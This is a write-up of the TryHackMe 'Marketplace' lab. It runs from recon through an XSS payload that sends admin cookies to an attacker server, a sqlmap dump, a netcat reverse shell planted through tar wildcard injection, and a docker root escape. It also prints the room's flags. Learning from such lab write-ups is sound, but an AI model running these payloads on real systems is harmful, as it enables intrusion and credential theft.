---
title: TryHackMe The Marketplace Writeup
date: 2023-07-05T13:34:41.636Z
description: My solution for the TryHackMe Room "The marketplace"
---
In this writeup, I will share my journey through the TryHackMe room "The Marketplace." This room offers a medium level of difficulty and delves into fascinating topics such as XSS (cross-site scripting), SQL Injection, and privilege escalation techniques. The target machine's IP address was `10.10.15.67`.

## R﻿econnaissance

To start, I conducted an nmap scan to discover the running services and open ports on the target machine.

```shell
$ nmap -sV 10.10.15.67
```

```
Nmap scan report for ip-10-10-15-67.eu-west-1.compute.internal (10.10.15.67)
Host is up (0.00038s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
...
```

Upon analysis, I discovered an OpenSSH instance and a web server running nginx 1.19.2. Curiosity led me to explore the website hosted on <http://10.10.15.67>.

## Website Exploration

![](/img/webpage.png)

The website appeared to be an online marketplace. After signing up and logging in, I gained access to additional features, such as creating listings and viewing messages. I also noticed the presence of a session cookie named "token," which helps the browser identify the logged-in user in order to display personalized content based on user access level (for example).

## Exploiting XSS Vulnerability

My objective was to replace my session token with that of an administrator or a high-level user. By doing so, I hoped to unlock administrative options and potentially achieve a reverse shell on the target machine. To test for XSS vulnerabilities, I experimented by embedding a textarea element in the content field while creating a listing. If the website rendered the textarea field when viewing the listing, it would indicate a vulnerability to XSS injection.

![](/img/textarea.png)

![](/img/textareaworking.png)

## Exploiting XSS and Cookie Stealing

Utilizing the identified XSS vulnerability, I crafted a malicious listing capable of stealing the user's cookie and sending it to my web server (which I will set up shortly). Leveraging the "report listing to administrator" function, the THM machine simulated an administrator visiting the listing, allowing me to capture their cookie.

F﻿irst, the cookie stealing payload:

> `<script>fetch('http://<YOUR_MACHINE_IP>:8000/steal?cookie='+btoa(document.cookie));</script>`

To capture the stolen cookies, I set up a web server using Python on port 8000. The server listened for incoming requests and logged any stolen cookies.

```shell
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Next, I submitted the listing, and reported it to the administrators.

![](/img/listing.png)

![](/img/reported.png)

When I looked in my web server, sure enough, I got the cookie! I then decoded it using the base64 tool in order to retrieve the decoded token.

![](/img/gotcookie.png)

## Replacing Cookies and Gaining Access

With the administrator's cookie successfully captured, I used a Firefox or Chrome "cookie editor" extension to replace my token cookie with the administrator's token. After reloading the page, a new navbar link appeared, granting me access to the "administration panel," which provided a comprehensive list of all users in the application. I could click on each user's link, observing the URL parameters, which were presumably used to query an SQL database on the backend and retrieve user information.

> **`h﻿ttp://10.10.15.67/admin?user=1`**

After some playing around, I managed to get the application to give a MySQL syntax error, meaning that an SQL injection vulnerability was present. Time for SQLMap!

## Exploiting SQL Injection

Recognizing the presence of an SQL injection vulnerability, I decided to utilize the SQLMap tool. I supplied the captured cookie value for authentication and included the delay argument to ensure successful exploitation of the vulnerability. (for some reason, without the delay argument, SQLMap did not work as expected)

```shell
$ sqlmap -u "http://10.10.15.67/admin?user=3" \
         --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODg1NjY3MTN9.6zpkfouKBuG5s17Dp_NVWbWDepJpe4cUGc22qzjM63U' \
         --delay=3 \
         --technique=U \
         --dump
```

The SQLMap command resulted in the extraction of three database tables, including listings, username and password hashes, and a table named "messages." I first tried brute-forcing the password hashes, but they were salted with bcrypt and I did not get anywhere. 

## Extracting Vital Information

Within the "messages" table, I stumbled upon a critical piece of information. A system-generated message addressed to user ID 3, belonging to "jake," alerted me to a weak SSH password and provided a temporary new password: "`@b_ENXkGYUCAv3zJ`."

```
Hello!\r\nAn automated system has detected your SSH password is too weak
and needs to be changed. You have been generated a new temporary password.
\r\nYour new password is: @b_ENXkGYUCAv3zJ 
```

Once I have obtained Jake's temporary password, "@b_ENXkGYUCAv3zJ," I proceed to log in as Jake via SSH and retrieve the user flag. After entering the provided password and getting the first flag, I can proceed to check my sudo privileges and available programs by typing `sudo -l`:

```shell
ssh jake@10.10.15.67
jake@10.10.15.67 s password: @b_ENXkGYUCAv3zJ 
jake@10.10.15.57$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
jake@10.10.15.67$ sudo -l
...
User jake may run the following commands on the-marketplace
  (michael) NOPASSWD: /opt/backups/backup.sh
```

 This command allowed me to see that my user (jake) can run the bash script at `/opt/backups/backup.sh` as the user `michael`

## Privilege Escalation via Exploitation of `tar` Command

I decided to look further into the bash script located at `/opt/backups/backup.sh`

```shell
jake@10.10.15.67:/opt/backups$ cat backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

After conducting some online research, I discovered a potential privilege escalation opportunity related to the script that takes a backup of everything in the `/opt/backup` directory using wildcard packing. This method can be exploited by creating empty files in the backup directory with names corresponding to command arguments for the `tar` command. I came across a helpful reference ([link](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)) that provided a detailed explanation of this exploit.

To take advantage of this vulnerability, I followed the steps outlined in the reference. Here are the commands I used:

```shell
jake@10.10.15.67$ cat > /opt/backups/rev.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP> 5555 >/tmp/f
EOF
jake@10.10.15.67$ chmod 777 /opt/backups/rev.sh
jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint=1"
jake@10.10.15.67$ echo "" > "/opt/backups/--checkpoint-action=exec=sh rev.sh"
jake@10.10.15.67$ cd /opt/backups; sudo -u michael /opt/backups/backup.sh
```

Omitted: I started a shell listener using `nc -lvp 5555`

Then, in my shell, I received a callback and a prompt! I then did some digging into the `michael `user

```shell
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5555
listening on [any] 5555
connect to [10.10.15.67] from (UNKNOWN) [<YOUR_IP>] 53896
michael@10.10.15.67:/opt/backups$ whoami
michael
michael@10.10.15.67:/opt/backups$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

## Docker Exploitation

From the `id`command, I noticed that `michael `is part of the `docker `group. After taking a quick look at GTFOBins for a docker root escalation ([GTFOBins](https://gtfobins.github.io/gtfobins/docker/)), I found one that would result in a root shell, which was perfect for me.

One thing I always like to do when I have a 'crappy' shell over netcat, is to upgrade it (make it properly interactive). In fact, the docker exploit will not work if the input device is not a TTY. The commands I used to upgrade the netcat shell are as follows:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL + Z
$ stty raw -echo; fg
# ENTER
export TERM=xterm-256color
```

GTFObins gave me the following command: 

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

I ran that command, and got a root shell! Then I just extracted the root flag and submitted it.

```
michael@the-marketplace$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
...
# whoami
root
# cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

## Conclusion

"The Marketplace" room from TryHackMe was good for learning - XSS is a crucial skill and being able to locate and execute a successful attack is important. By exploiting an SQL injection vulnerability, I was able to gain access to the system and uncover further escalate my privileges. One complaint I have for this room is the root privilege escalation - it was too easy. Copying payloads from GTFOBins is too easy of a win!